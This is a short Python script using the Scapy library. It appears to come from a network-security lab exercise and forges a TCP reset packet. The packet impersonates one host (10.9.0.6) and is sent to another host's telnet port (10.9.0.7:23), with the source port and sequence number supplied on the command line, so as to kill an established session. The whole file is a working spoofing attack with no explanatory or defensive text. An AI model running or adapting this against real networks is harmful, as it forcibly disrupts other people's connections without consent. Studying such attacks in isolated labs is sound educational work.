from scapy.all import *
import argparse

def spoof_reset_packet(src_port, seq_num):
	user1_ip = "10.9.0.6"
	user2_ip = "10.9.0.7"

	user1_port = src_port
	user2_port = 23

	ip = IP(src=user1_ip, dst=user2_ip)
	tcp = TCP(sport=user1_port, dport=user2_port, flags="R", seq=seq_num)
	pkt = ip/tcp

	print("SENDING RESET PACKET........")
	send(pkt, verbose=0)

if __name__ == "__main__":
	parser = argparse.ArgumentParser()
	parser.add_argument("-p", "--src_port", type=int, help="source port", required=True)
	parser.add_argument("-s", "--seq", type=int, help="last sequence number", required=True)

	args = parser.parse_args()

	spoof_reset_packet(args.src_port, args.seq)
